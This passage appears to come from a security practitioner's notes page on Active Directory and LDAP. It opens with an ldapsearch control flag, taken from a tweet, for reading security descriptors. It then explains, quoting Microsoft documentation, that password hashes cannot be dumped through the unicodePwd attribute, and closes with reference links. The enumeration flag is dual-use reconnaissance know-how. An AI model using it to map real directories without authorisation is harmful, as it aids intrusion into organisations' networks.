-E '!1.2.840.113556.1.4.801=::MAMCAQc=' [pic.twitter.com/vMi7RPsYPB](https://t.co/vMi7RPsYPB)

[March 18, 2021](https://twitter.com/tifkin_/status/1372628611677753344?ref_src=twsrc%5Etfw)

### AD Password Dumping via LDAP

- src: [https://stackoverflow.com/questions/59406408/is-there-any-way-to-retrieve-password-hashes-from-an-active-directory-via-ldap](https://stackoverflow.com/questions/59406408/is-there-any-way-to-retrieve-password-hashes-from-an-active-directory-via-ldap)
- src: [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/6e803168-f140-4d23-b2d3-c3a8ab5917d2](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/6e803168-f140-4d23-b2d3-c3a8ab5917d2)

Every so often I forget it’s **not possible** to sync passwords from the `unicodePwd` attribute. I’m saving this here mostly so I don’t waste my time trying again.

From MSDN:

The unicodePwd attribute is never returned by an LDAP search.

## References

For futher info, the [LDAP Wiki](https://ldapwiki.com/wiki/) is an amazing resource.

### Ropnop’s Talk at Troopers 2019

You should absolutely check out [Ropnop](https://twitter.com/ropnop) (and follow him on Twitter) if you want to learn more.
